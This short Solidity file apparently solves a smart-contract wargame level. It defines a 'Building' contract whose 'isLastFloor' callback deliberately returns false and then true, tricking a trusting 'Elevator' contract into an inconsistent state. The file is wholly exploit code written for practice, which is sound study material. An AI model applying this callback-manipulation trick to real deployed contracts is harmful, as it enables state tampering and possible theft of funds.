// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator  {
	function goTo(uint _floor) external ;
  
}
contract Building  {

    bool public firstCall;
    Elevator public target ;

    constructor(address _target)  {
      firstCall = true;
      target = Elevator(_target);
    }
   
    function isLastFloor(uint ) external returns (bool){
      if(firstCall){
        firstCall = false;
        return false;
      } else {
        return true;
      }
      
    }

    function callgoTo(uint _floor) external 
    { 
      target.goTo(_floor);
    }

}